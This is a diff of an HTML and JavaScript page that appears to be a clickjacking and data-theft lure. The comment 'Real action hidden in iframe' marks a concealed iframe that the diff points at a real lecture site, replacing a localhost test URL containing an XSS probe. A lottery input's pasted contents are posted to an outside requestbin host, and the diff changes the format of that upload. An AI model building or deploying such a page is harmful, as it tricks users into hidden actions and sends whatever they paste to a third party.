@@ -74,7 +74,7 @@
 
   <!-- Real action hidden in iframe -->
 	<div class="iframe-wrapper">
-	  <iframe class="iframe-inner" src="http://localhost:8081/w/imgsrcxonerroralert(1)/11"></iframe>
+	  <iframe class="iframe-inner" src="https://tum.live/w/SoSe25Ecg/57942"></iframe>
 	</div>
 
 
@@ -99,11 +99,11 @@
 	  // Send to server
 	  fetch("https://requestbin.kanbanbox.com/158ymww1", {
 		method: "POST",
-		headers: {
-		  "Content-Type": "application/json",
-		},
-		body: JSON.stringify({ ticket: pasted }),
-	  }).catch(err => console.error("Failed to send:", err));
+			headers: {
+			  "Content-Type": "application/x-www-form-urlencoded"
+			},
+			body: pasted.toString()
+		  });
 
 	  lotteryInput.value = "";
 	});
